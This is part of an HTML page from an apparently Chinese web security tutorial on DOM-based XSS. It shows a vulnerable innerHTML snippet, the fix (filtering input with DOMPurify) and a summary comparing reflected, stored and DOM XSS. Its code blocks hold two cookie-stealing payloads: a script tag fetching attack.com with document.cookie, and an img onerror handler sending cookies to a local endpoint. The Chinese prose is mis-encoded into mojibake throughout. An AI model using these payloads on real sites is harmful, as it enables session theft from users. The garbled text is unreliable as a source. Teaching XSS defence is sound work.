id="dom-å‹-xss-æ”»é˜²å®æˆ˜"><a href="#dom-å‹-xss-æ”»é˜²å®æˆ˜" class="header-anchor">#</a> DOM å‹ XSS æ”»é˜²å®æˆ˜</h2> <p>DOM å‹ XSS ä¸åå°„å‹æˆ–å­˜å‚¨å‹ XSS çš„åŒºåˆ«åœ¨äºï¼ŒDOM å‹åœ¨æœåŠ¡å™¨è¿”å›çš„ç½‘é¡µæˆ–è„šæœ¬ä¸­æ˜¯çœ‹ä¸åˆ°æ¶æ„ä»£ç çš„ï¼Œè€Œæ˜¯åœ¨æ›´æ–° DOM æ ‘çš„æ—¶å€™è§¦å‘äº†æ¶æ„è„šæœ¬çš„æ‰§è¡Œã€‚</p> <h3 id="æ”»å‡»æ¡ˆä¾‹-3"><a href="#æ”»å‡»æ¡ˆä¾‹-3" class="header-anchor">#</a> æ”»å‡»æ¡ˆä¾‹</h3> <p>æˆ‘ä»¬æ¥çœ‹ä¸€åˆ™æ¨¡æ‹Ÿæ¡ˆä¾‹ï¼Œå‰ç«¯å¼€å‘äººå‘˜æœªç»è¿‡æ»¤å°±ç›´æ¥æŠŠç”¨æˆ·è¾“å…¥æ’å…¥åˆ° HTML ä¸­ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;input id=&quot;input&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;container.innerHTML = input.value&quot;&gt;ç‚¹å‡»&lt;/button&gt;&lt;p id=&quot;container&quot;&gt;&lt;/p&gt;
</code></pre></div><p>è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæ­¤æ—¶ç”¨æˆ·è¾“å…¥äº†ä¸‹é¢ä¸€æ®µæ¶æ„è„šæœ¬çš„è¯ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;script&gt;fetch(`https://attack.com?cookie=${document.cookie}`)&lt;/script&gt;
</code></pre></div><p>å€¼å¾—åº†å¹¸çš„æ˜¯ï¼Œå¤§éƒ¨åˆ†ç°ä»£æµè§ˆå™¨éƒ½å®ç°äº† HTML5 çš„å®‰å…¨è§„èŒƒï¼š</p> <blockquote><p>ä¸æ‰§è¡Œç”± innerHTML æ’å…¥çš„ script æ ‡ç­¾ã€‚</p></blockquote> <p>ä½†æ˜¯è¿™å°±è¶³å¤Ÿå®‰å…¨äº†å—ï¼Ÿéä¹Ÿï¼Œè¯·çœ‹ä¸‹é¢çš„è¾“å…¥ï¼š</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;img src=&quot;x&quot; onerror=&quot;fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)&quot;&gt;
</code></pre></div><p>æ¶æ„è„šæœ¬ä¾ç„¶åœ¨ onerror å›è°ƒä¸­è¢«è§¦å‘äº†ï¼</p> <h3 id="é˜²å¾¡æ–¹æ¡ˆ-3"><a href="#é˜²å¾¡æ–¹æ¡ˆ-3" class="header-anchor">#</a> é˜²å¾¡æ–¹æ¡ˆ</h3> <p>è¿™é‡Œæ¨èä½¿ç”¨ DOMPurify åº“å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åå†ä½¿ç”¨ innerHTML æ’å…¥åˆ° DOM ä¸­ã€‚</p> <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="header-anchor">#</a> æ€»ç»“</h2> <p>åå°„å‹ XSS æ”»å‡»çš„æ‰‹æ®µå°±æ˜¯è¯±å¯¼ç”¨æˆ·ç‚¹å‡»ï¼Œè¿™ç§æ”»å‡»æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œç”¨æˆ·ç‚¹å‡»å°±ä¸­æ‹›ï¼Œä¸ç‚¹å°±æ²¡äº‹ï¼Œå±å®³æ€§ä¸å¦‚å­˜å‚¨å‹çš„å¤§ï¼Œä½†æ˜¯å°ç™½ç”¨æˆ·å¾ˆå®¹æ˜“è¢«ç›—å·ã€‚</p> <p>å­˜å‚¨å‹ XSS æ”»å‡»èŒƒå›´å¹¿ï¼Œå—å®³é¢ç§¯å¤§ï¼Œä¸”ä¸å®¹æ˜“åŠæ—¶å‘ç°å’Œæ’æŸ¥ï¼Œä¸€å®šè¦å¤šåŠ å°å¿ƒï¼Œå¯¹äºç”¨æˆ·è¾“å…¥çš„ä»»ä½•å†…å®¹éƒ½ä¸è¦å®Œå…¨ä¿¡ä»»ï¼Œå¯¹äºåŠ¨æ€æ¸²æŸ“çš„æ–‡æœ¬ä¸€å®šè¦è¿›è¡Œè½¬ä¹‰ã€‚</p> <p>DOM å‹ XSS æ”»å‡»éšç€å•é¡µé¢åº”ç”¨æ™®åŠå’Œæµè¡Œæ„ˆå‘å¸¸è§ï¼Œå› ä¸ºåœ¨å•é¡µé¢åº”ç”¨ä¸­ JS ç»å¸¸æ“ä½œ DOMï¼Œè€Œ DOM å‹ XSS æ”»å‡»å°±æ˜¯åˆ©ç”¨äº†æµè§ˆå™¨è§£ææœºåˆ¶ï¼Œå› æ­¤å¾ˆå®¹æ˜“è§¦å‘ DOM å‹ XSS æ”»å‡»ã€‚ä¸è¿‡å¥½åœ¨å¤§éƒ¨åˆ†å‰ç«¯æ¡†æ¶ï¼Œä¾‹å¦‚ Vueã€Angular éƒ½å†…ç½® DOM å‹ XSS æ”»å‡»çš„é˜²å¾¡æœºåˆ¶ã€‚</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">æœ€åæ›´æ–°æ—¶é—´:</span> <span class="time">11/13/2020, 2:09:46 PM</span></div></footer> <!----> </main></div><div class="global-ui"><!----></div></div>
    <script src="/assets/js/app.f8839a88.js" defer></script><script src="/assets/js/2.8d06e467.js" defer></script><script src="/assets/js/69.158d7968.js" defer></script>
  </body>
</html>
